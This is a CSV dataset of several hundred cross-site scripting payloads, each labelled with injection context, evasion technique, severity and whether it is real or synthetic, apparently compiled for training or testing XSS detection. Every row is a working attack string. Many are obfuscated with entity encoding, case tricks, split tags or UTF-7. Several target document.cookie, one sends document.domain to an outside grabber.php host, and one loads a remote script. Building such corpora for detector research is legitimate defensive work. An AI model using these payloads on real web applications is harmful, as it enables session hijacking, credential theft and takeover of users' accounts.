payload,context,technique,severity,length,source
<scr	ipt>/*/prompt('XSS')</scr	ipt>,script_injection,synthetic,medium,35,synthetic
"<shadow onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></shadow>",event_handler,none,medium,285,real
%22 onmouseenter=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,43,synthetic
"<svg onmouseover=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,59,synthetic
"<del draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,84,real
<dialog onpointerup=alert(1) style=display:block>AnonKryptiQuz</dialog>,event_handler,none,medium,71,real
"""><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\""})))}catch(e){alert(1337)}//' allowscriptaccess=always>",tag_injection,none,medium,160,real
<button popovertarget=x>Click me</button><code ontoggle=alert(1) popover id=x>AnonKryptiQuz</code>,event_handler,none,medium,98,real
"<a href=""javas\x01cript:javascript:alert(4927)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></h1>",event_handler,none,medium,164,real
%22><svg onmouseenter=console.log(1)>,tag_injection,synthetic,medium,37,synthetic
%22><svg onmouseenter=prompt(document.cookie)>,tag_injection,synthetic,medium,46,synthetic
"<strong oncut=""alert(1)"" contenteditable>AnonKryptiQuz</strong>",event_handler,none,medium,63,real
"<blockquote oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,103,real
"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></command>",event_handler,none,medium,132,real
%22 onerror=prompt(%27XSS%27) %22,attribute_escape,synthetic,medium,33,synthetic
"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></abbr>",event_handler,none,medium,126,real
""" onmouseenter=alert(location.hash) """,attribute_escape,synthetic,medium,37,synthetic
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",event_handler,none,medium,95,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",event_handler,none,medium,178,real
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(1)>,tag_injection,synthetic,medium,53,synthetic
"<del onmouseout=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,46,real
"""><Svg onFocUs=AleRt(LocAtiOn.HasH)>",tag_injection,synthetic,medium,36,synthetic
"""><svg onmouseover=confirm(1)>",tag_injection,synthetic,medium,30,synthetic
alert(1)>//INJECTX,generic,none,medium,18,real
"<p draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,79,real
"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",event_handler,none,medium,117,real
<keygen onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<IMG SRC=”javascript:alert(‘AnonKryptiQuz’)”,js_uri,case_variation,medium,44,real
"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=print()></q>",event_handler,none,low,119,real
<BODY ONLOAD=alert(�AnonKryptiQuz�)>,event_handler,case_variation,medium,36,real
"<style onbeforecut=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,87,real
<frameset><frame onload=alert(1)>,event_handler,none,medium,33,real
foo\’; alert(document.cookie);//’;,dom_sink,none,high,34,real
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable style=display:block>drop here</frame>",event_handler,none,medium,131,real
x='javascript:alert\x2823\x29';x={x:location}=this,js_uri,none,low,50,real
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=print()></kbd>",event_handler,none,low,123,real
"<<TexTArEa/*%00//%00*/a=""not""/*%00///AutOFocUs////onFoCUS=alert`AnonKryptiQuz` //",event_handler,comment_injection|url_encoding|case_variation,low,81,real
"<style>@keyframes x{}</style><img2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></img2>",event_handler,none,medium,99,real
%22><svg onload=prompt(document.domain)>,tag_injection,synthetic,medium,40,synthetic
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(STriNg.FroMChArCOde(88,83,83))>"")",dom_sink,synthetic,medium,74,synthetic
‘ onfocus=’alert(1)’,event_handler,none,medium,20,real
"<applet onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,74,real
<svg onfocus=prompt('XSS')/>,tag_injection,synthetic,medium,28,synthetic
<body onselectstart=alert(1)>select some text,event_handler,none,medium,45,real
"<style>@keyframes x{}</style><source style=""animation-name:x"" onwebkitanimationend=""alert(1)""></source>",event_handler,none,medium,103,real
"<set onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,79,real
"<table draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,88,real
<marquee width=1 loop=1 onbounce=alert(1)>AnonKryptiQuz</marquee>,event_handler,none,medium,65,real
<svg ontoggle=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,34,synthetic
<svG oNerRor=coNsoLe.Log(doCumEnt.coOkiE)/>,tag_injection,synthetic,medium,43,synthetic
"<acronym onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",event_handler,none,medium,71,real
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,event_handler,none,medium,66,real
<svg onunload=window.open('javascript:alert(1)')>,event_handler,none,medium,49,real
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",js_uri,case_variation,medium,61,real
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",event_handler,none,medium,132,real
"<table onmouseenter=""alert(1)"">AnonKryptiQuz</table>",event_handler,none,medium,52,real
"""%3E%3Csvg onmouseover=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,68,synthetic
"<script>/*/&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,medium,74,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></pre>",event_handler,none,medium,176,real
"<dir onmouseover=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,47,real
<scr	ipt>confirm`1`</scr	ipt>,script_injection,synthetic,medium,29,synthetic
"<textarea ondblclick=""alert(1)"">AnonKryptiQuz</textarea>",event_handler,none,medium,56,real
"<table draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,86,real
<br onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<rtc onclick=""alert(1)"">AnonKryptiQuz</rtc>",event_handler,none,medium,43,real
"<svg onerror=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,52,synthetic
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});,dom_sink,none,medium,87,real
"<nextid oncontextmenu=""alert(1)"">AnonKryptiQuz</nextid>",event_handler,none,medium,55,real
<progress onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</progress>,event_handler,none,medium,82,real
"<dd onmouseleave=""alert(1)"">AnonKryptiQuz</dd>",event_handler,none,medium,46,real
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationstart=""alert(1)""></header>",event_handler,none,medium,99,real
"<frameset onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",event_handler,none,medium,73,real
<svG oNerRor=coNsoLe.Log(1)/>,tag_injection,synthetic,medium,29,synthetic
"<style onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</style>",event_handler,none,medium,63,real
%3Csvg onerror=prompt('XSS')/%3E,tag_injection,synthetic,medium,32,synthetic
"<a href=""  &#x8; &#23;   javascript:alert('Successful AnonKryptiQuz')"">Click this link!</a>",js_uri,html_entity,medium,91,real
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>,event_handler,none,medium,51,real
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>,script_injection,none,low,95,real
"<IMG SRC='vbscript:msgbox(""XSS"")'>",tag_injection,case_variation,low,34,real
<svg onload=confirm(document.cookie)>,tag_injection,synthetic,medium,37,synthetic
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></sub>",event_handler,none,medium,99,real
""" oNloAd=ConSolE.lOg('XSS') """,attribute_escape,synthetic,medium,29,synthetic
"""`'><script>\x0Djavascript:alert(1)</script>",script_injection,none,medium,44,real
"""><svg onload=confirm(document.cookie)>",tag_injection,synthetic,medium,39,synthetic
"<p onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,75,real
"<slot onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</slot>",event_handler,none,medium,63,real
"<noscript onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,77,real
onfocus=JaVaSCript:alert(123) autofocus,event_handler,none,medium,39,real
<script>//confirm(%27XSS%27)</script>,script_injection,synthetic,medium,37,synthetic
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",event_handler,none,medium,91,real
"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",script_injection,none,low,86,real
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,71,synthetic
<section onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<menu draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,66,real
%27 onbegin=confirm(1) %27,attribute_escape,synthetic,medium,26,synthetic
"<svg onclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,71,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""print()""></ins>",event_handler,none,low,175,real
"<dd oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",event_handler,none,medium,72,real
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable style=display:block>drop here</frameset>",event_handler,none,medium,133,real
"<meta oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
<meter onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</meter>,event_handler,none,medium,76,real
"<td onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</td>",event_handler,none,medium,59,real
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,event_handler,none,medium,64,real
<w contenteditable id=x onfocus=alert()>,event_handler,none,medium,40,real
[color=red width=expression(alert(123))][color],generic,none,medium,47,real
"<area onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></area>",event_handler,none,medium,281,real
"<nobr onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",event_handler,none,medium,63,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,medium,94,synthetic
"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",event_handler,none,high,156,real
<IMG SRC=�javascript:alert(�AnonKryptiQuz�)�,js_uri,case_variation,medium,44,real
"<optgroup onmouseover=""alert(1)"">AnonKryptiQuz</optgroup>",event_handler,none,medium,57,real
"setTimeout(""confirm(document.domain)"",0)",dom_sink,synthetic,medium,40,synthetic
"""><svg onmouseover=alert('XSS')>",tag_injection,synthetic,medium,32,synthetic
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",event_handler,none,medium,111,real
'><script>alert(1)</script><',script_injection,none,medium,29,real
"<object onmouseleave=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,54,real
"<cite onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</cite>",event_handler,none,medium,64,real
"<legend onmouseleave=""alert(1)"">AnonKryptiQuz</legend>",event_handler,none,medium,54,real
"<image oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
<scRipT>//coNsoLe.Log(doCumEnt.doMaiN)</scRipT>,script_injection,synthetic,medium,47,synthetic
"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></details>",event_handler,none,medium,118,real
"""><svg onclick=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,53,synthetic
%3Csvg onerror=console.log(document.domain)/%3E,tag_injection,synthetic,medium,47,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>",event_handler,none,medium,101,real
"<data draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,86,real
"<div id=""44""><style>*[{}@import'AnonKryptiQuz.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(AnonKryptiQuz.sct)"">//[""'`-->]]>]</div>",script_injection,none,medium,917,real
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",event_handler,none,medium,99,real
"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>",event_handler,none,medium,134,real
"<custom tags onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</custom tags>",event_handler,none,medium,95,real
"javascript:alert()//'//""//\""; '/`/*\/*'/*""/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>",script_injection,comment_injection,medium,179,real
"<source oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</source>",event_handler,none,medium,64,real
<button onpointerup=alert(1) style=display:block>AnonKryptiQuz</button>,event_handler,none,medium,71,real
"<pre onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",event_handler,none,medium,63,real
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=print()></b>",event_handler,none,low,119,real
"<a href=""&#x6a;avascript:alert(1)"">AnonKryptiQuz</a>",attribute_escape,html_entity,medium,52,real
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>",event_handler,none,medium,91,real
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onwebkitanimationend=""alert(1)""></sub>",event_handler,none,medium,97,real
"<table background=""javascript:javascript:alert(1)"">",js_uri,none,medium,51,real
"<content onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</content>",event_handler,none,medium,75,real
<address onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</address><input value=clickme>,event_handler,none,medium,105,real
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable style=display:block>drop here</svg>",event_handler,none,medium,127,real
""" onfocus=prompt(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape,synthetic,medium,59,synthetic
"<address draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,72,real
"<svg on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,73,synthetic
"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=print()></tfoot>",event_handler,none,low,112,real
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,generic,none,medium,155,real
%3Csvg onclick=console.log(1)%3E,tag_injection,synthetic,medium,32,synthetic
"<center draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</center>",event_handler,none,medium,70,real
"<section draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,72,real
"<style>:target {transform: rotate(180deg);}</style><html id=x style=""transition:transform 2s"" ontransitionrun=print()></html>",event_handler,none,low,125,real
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationend=""alert(1)""></image3>",event_handler,none,medium,97,real
"<style>:target {transform: rotate(180deg);}</style><sub id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sub>",event_handler,none,medium,124,real
""" onbegin=console.log(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><element style=""animation-name:x"" onwebkitanimationend=""alert(1)""></element>",event_handler,none,medium,105,real
"<svg onmouseenter=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"""><svg onload=alert&#x2F;#x00000040""1"")>",event_handler,html_entity,low,40,real
"<big oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,69,real
"""><Svg onMouSeeNteR=cOnsOle.loG(dOcuMenT.cOokIe)>",tag_injection,synthetic,medium,49,synthetic
"document.write(""%3Cimg src=x onerror=alert(String.fromCharCode(88,83,83))%3E"")",dom_sink,synthetic,medium,78,synthetic
<dir onpointerover=alert(1) style=display:block>AnonKryptiQuz</dir>,event_handler,none,medium,67,real
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionstart=alert(1)></span>",event_handler,none,medium,108,real
"<cite onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,69,real
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=print()></ins>",event_handler,none,low,108,real
javascr	ipt:void(confirm('XSS')),js_uri,synthetic,medium,32,synthetic
"<tfoot onmousedown=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,51,real
"<dl onmouseleave=""alert(1)"">AnonKryptiQuz</dl>",event_handler,none,medium,46,real
<svg onfocus=console.log(location.hash)/>,tag_injection,synthetic,medium,41,synthetic
%3Csvg onmouseenter=alert(1)/%3E,tag_injection,synthetic,medium,32,synthetic
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(6819)"">",js_uri,case_variation,medium,58,real
"""><svg onerror=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,52,synthetic
"<video2 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<rtc onmouseup=""alert(1)"">AnonKryptiQuz</rtc>",event_handler,none,medium,45,real
"<address onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</address>",event_handler,none,medium,87,real
"<html onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,70,real
"javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/""/+/[*/[]/+alert()//'-->\"" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>",script_injection,comment_injection,medium,203,real
"?baseurl=asfunction:getURL,javascript:alert(1)//"",",js_uri,none,medium,50,real
%22 onbegin=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
"<noframes onmousedown=""alert(1)"">AnonKryptiQuz</noframes>",event_handler,none,medium,57,real
<dialog contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
"<hgroup ondblclick=""alert(1)"">AnonKryptiQuz</hgroup>",event_handler,none,medium,52,real
' onclick=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><select style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></select>",event_handler,none,medium,172,real
"<samp onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,69,real
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",script_injection,encoding|url_encoding,high,313,real
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",tag_injection,case_variation,medium,51,real
"<div draggable=""true"" contenteditable>drag me</div><time ondragover=alert(1) contenteditable style=display:block>drop here</time>",event_handler,none,medium,129,real
"<select onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</select>",event_handler,none,medium,68,real
<svg onclick=alert(location.hash)/>,tag_injection,synthetic,medium,35,synthetic
&#x0003c;,generic,html_entity,low,9,real
"<dialog draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,90,real
' onmouseover=console.log(document.domain) ',attribute_escape,synthetic,medium,44,synthetic
<button popovertarget=x>Click me</button><xmp onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</xmp>,event_handler,none,medium,102,real
<!<script>alert(1)</script> “,script_injection,none,medium,29,real
"""><svg onclick=prompt(document.domain)>",tag_injection,synthetic,medium,39,synthetic
javascr	ipt:console.log(document.cookie),js_uri,synthetic,medium,40,synthetic
"<dir draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,84,real
"<nobr onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",event_handler,none,medium,64,real
"<math xlink:href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</math>",event_handler,html_entity|comment_injection|url_encoding,medium,210,real
"<bdo draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</bdo>",event_handler,none,medium,64,real
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-,dom_sink,none,medium,57,real
"<img2 oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<object><param name=""src"" value=""javascript:alert(0)""></param></object>",js_uri,none,medium,71,real
“ OnMouseOver=”prompt`AnonKryptiQuz`,event_handler,none,low,36,real
"<svg onmouseover=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<menuitem ondblclick=""alert(1)"">AnonKryptiQuz</menuitem>",event_handler,none,medium,56,real
<content id=x tabindex=1 onfocusin=alert(1)></content>,event_handler,none,medium,54,real
"%3Csvg onmouseenter=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,61,synthetic
<script>alert('\u0031')</script>,script_injection,unicode_escape,medium,32,real
"<sub onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,68,real
"<svG oNclIck=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
"xyz';""/></textarea><Img Src=OnAnonKryptiQuz OnError=prompt(document.cookie)>",event_handler,case_variation,high,76,real
<svG oNmoUseEntEr=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink,synthetic,medium,107,synthetic
"<a href=""javascript:alert(1)"" onmouseover=alert(1)>INJECTX HOVER</a>",event_handler,none,medium,68,real
"<table onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</table>",event_handler,none,medium,63,real
<svg onfocus=consol&#101;.log('XSS')/>,tag_injection,synthetic,medium,38,synthetic
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=print()></rp>",event_handler,none,low,121,real
"<iframe2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</iframe2>",event_handler,none,medium,95,real
"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",event_handler,none,medium,113,real
"<details onmouseover=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,55,real
"'>""><script src = 'http://www.site.com/XSS.js'></script>",script_injection,none,low,56,real
"' oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape,synthetic,medium,54,synthetic
"<sup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</sup>",event_handler,none,medium,67,real
"<acronym onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></acronym>",event_handler,none,medium,287,real
"<tt onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,65,real
"<image3 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,90,real
"<element draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</element>",event_handler,none,medium,92,real
<tt onpointerleave=alert(1) style=display:block>AnonKryptiQuz</tt>,event_handler,none,medium,66,real
%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E,generic,url_encoding,low,55,real
"<track oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,73,real
""" onclick=alert(document.domain) """,attribute_escape,synthetic,medium,34,synthetic
